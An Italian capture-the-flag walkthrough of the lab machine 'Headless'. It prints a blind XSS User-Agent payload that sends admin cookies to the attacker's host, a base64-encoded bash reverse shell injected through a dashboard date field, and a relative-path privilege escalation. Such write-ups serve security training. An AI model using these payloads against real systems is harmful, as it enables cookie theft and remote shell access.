---
title: "Headless Walkthrough"
description: "Headless è una macchina easy-difficulty basata su Linux che ospita un server Python Werk­zeug, il quale gestisce un sito web. All’interno del sito è presente un modulo di customer support vulnerabile a blind Cross-Site Scripting (XSS) tramite l’header User-Agent. Questa falla viene sfruttata per sottrarre il cookie di amministratore, consentendo così l’accesso alla dashboard admin. Tale pagina risulta vulnerabile a command injection, permettendo di stabilire una reverse shell sulla macchina. Analizzando la posta dell’utente emerge uno script che non utilizza path assoluti: l’attaccante sfrutta questa debolezza per ottenere una shell come root."
author: dua2z3rr
date: 2025-09-15 1:00:00
categories: [Machines]
tags: ["Area di Interesse: Session Management and Hijacking", "Area di Interesse: Injections", "Area di Interesse: Web Application", "Vulnerabilità: OS Command Injection", "Vulnerabilità:  Cross Site Scripting (XSS)", "Vulnerabilità:  Misconfiguration", "Codice: Bash", "Codice: JavaScript"]
image: /assets/img/headless/headless-resized.png"
---

## Enumerazione Esterna

### Nmap

Eseguiamo nmap sulla macchina bersaglio.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $sudo nmap 10.10.11.8 -vv -p-
<SNIP>
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
5000/tcp open  upnp    syn-ack ttl 63

<SNIP>

┌─[dua2z3rr@parrot]─[~]
└──╼ $sudo nmap 10.10.11.8 -vv -p 22,5000 -sC -sV
<SNIP>
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJXBmWeZYo1LR50JTs8iKyICHT76i7+fBPoeiKDXRhzjsfMWruwHrosHoSwRxiqUdaJYLwJgWOv+jFAB45nRQHw=
|   256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICkBEMKoic0Bx5yLYG4DIT5G797lraNQsG5dtyZUl9nW
5000/tcp open  upnp?   syn-ack ttl 63
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Mon, 15 Sep 2025 19:03:00 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2799
|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Under Construction</title>
|     <style>
|     body {
|     font-family: 'Arial', sans-serif;
|     background-color: #f7f7f7;
|     margin: 0;
|     padding: 0;
|     display: flex;
|     justify-content: center;
|     align-items: center;
|     height: 100vh;
|     .container {
|     text-align: center;
|     background-color: #fff;
|     border-radius: 10px;
|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=9/15%Time=68C862E4%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,BE1,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\.2\
SF:x20Python/3\.11\.2\r\nDate:\x20Mon,\x2015\x20Sep\x202025\x2019:03:00\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x202799\r\nSet-Cookie:\x20is_admin=InVzZXIi\.uAlmXlTvm8vyihjNaPDWnvB_Z
SF:fs;\x20Path=/\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\
SF:x20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\
SF:x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-wid
SF:th,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Under\x20Construct
SF:ion</title>\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x20\x20\x20\x20b
SF:ody\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\
SF:x20'Arial',\x20sans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20background-color:\x20#f7f7f7;\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20padding:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20di
SF:splay:\x20flex;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justif
SF:y-content:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:align-items:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20height:\x20100vh;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20\.container\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20text-align:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20background-color:\x20#fff;\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20border-radius:\x2010px;\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20box-shadow:\x200px\x200px\x2020px\x20rgba\(0,\x20
SF:0,\x200,\x200\.2\);\n\x20\x20\x20\x20\x20")%r(RTSPRequest,16C,"<!DOCTYP
SF:E\x20HTML>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20
SF:\x20\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x
SF:20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x
SF:20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20resp
SF:onse</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20vers
SF:ion\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\
SF:x20code\x20explanation:\x20400\x20-\x20Bad\x20request\x20syntax\x20or\x
SF:20unsupported\x20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Analizziamo l'output: abbiamo una porta ssh e la porta 5000 che, anche se il servizio indicato è **upnp?**, in realtà è un sito web.

### HTTP

![Desktop View](/assets/img/headless/headless-homepage.png)

Se clicchiamo sul pulsante **For questions** verremo reindirizzati alla directory `/support`.

![Desktop View](/assets/img/headless/headless-support.png)

### Exploit

Possiamo provare a exploitare una vulnerabilità **XSS** visto che non sembra ci sia alcuna validazione degli input a parte per il campo **mail**.

![Desktop View](/assets/img/headless/headless-xss-test.png)

Tuttavia questo non porta ad alcun risultato perchè veniamo beccati.

![Desktop View](/assets/img/headless/headless-hacking-attempt.png)

Una cosa che prima non hofatto notare, è che nelle GET request che inviamo al server c'è sempre un token: `is_admin`.

Proviamo ad ottenere il token modificando la richiesta.

```txt
POST /support HTTP/1.1
Host: 10.10.11.8:5000
User-Agent: <script>var i=new Image(); i.src="http://10.10.14.41:5000/?
cookie="+btoa(document.cookie);</script>
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 112
Origin: http://10.10.11.8:5000
Connection: close
Referer: http://10.10.11.8:5000/support
Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
Upgrade-Insecure-Requests: 1
fname=test&lname=test&email=test%40headless.htb&phone=0700000000&message=%3Cscript%3Ealert
%281%29%3C%2Fscript%3E
```

```shell
python3 -m http.server 5000
Serving HTTP on 0.0.0.0 port 5000 (http://0.0.0.0:5000/) ...

10.10.11.8 - - [14/Jul/2024 11:08:42] "GET /?
cookie=aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA= HTTP/1.1" 200
```

Abbiamo ottenuto l'admin token!

### Fuzzing

Non potendo fare altro con questo token, fuzziamo il sito.

```shell
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-
medium.txt:FFUZ -u http://10.10.11.8:5000/FFUZ -ic -t 100
<...SNIP...>
________________________________________________
 :: Method : GET
 :: URL : http://10.10.11.8:5000/FFUZ
 :: Wordlist : FFUZ: /usr/share/wordlists/SecLists/Discovery/WebContent/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 100
 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________
[Status: 200, Size: 2799, Words: 963, Lines: 96, Duration: 197ms]
 * FFUZ:
[Status: 200, Size: 2363, Words: 836, Lines: 93, Duration: 322ms]
 * FFUZ: support
[Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 236ms]
 * FFUZ: dashboard
```

Abbiamo trovato la directory dashboard. Andiamoci utilizzando il token admin.

### dashboard

![Desktop View](/assets/img/headless/headless-dashboard.png)

Modificando la richiesta quando clicchiamo su **Generate report** possiamo ottenere remote code execution.

```text
POST /dashboard HTTP/1.1
Host: 10.10.11.8:5000
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.10.11.8:5000/dashboard
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: http://10.10.11.8:5000
Connection: close
Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
Upgrade-Insecure-Requests: 1
date=2023-09-15;echo "L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjkvOTAwMSAwPiYx" | base64 -d | bash
```

Otteniamo una shell.

## Shell come dvir

Attraverso `sudo -l` possiamo vedere che possiamo runnare uno script come root.

```shell
dvir@headless:~/app$ sudo -l
Matching Defaults entries for dvir on headless:
 env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
 use_pty
User dvir may run the following commands on headless:
 (ALL) NOPASSWD: /usr/bin/syscheck
```

Leggiamo cosa fa lo script.

```shell
dvir@headless:~/app$ cat /usr/bin/syscheck

#!/bin/bash
if [ "$EUID" -ne 0 ]; then
exit 1
fi
last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + |
/usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"
disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"
load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"
if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
 /usr/bin/echo "Database service is not running. Starting it..."
 ./initdb.sh 2>/dev/null
else
 /usr/bin/echo "Database service is running."
fi
exit 0
```

Vedo subito che viene eseguito uno script di nome **initdb.sh** con path relativo. Vado immediatamente sulla mia home direcotry e creo un file con quel nome.

```shell
dvir@headless:~/app$ echo "cat /root/root.txt" > init.db
```

Eseguiamo lo script e otteniamo la root flag.
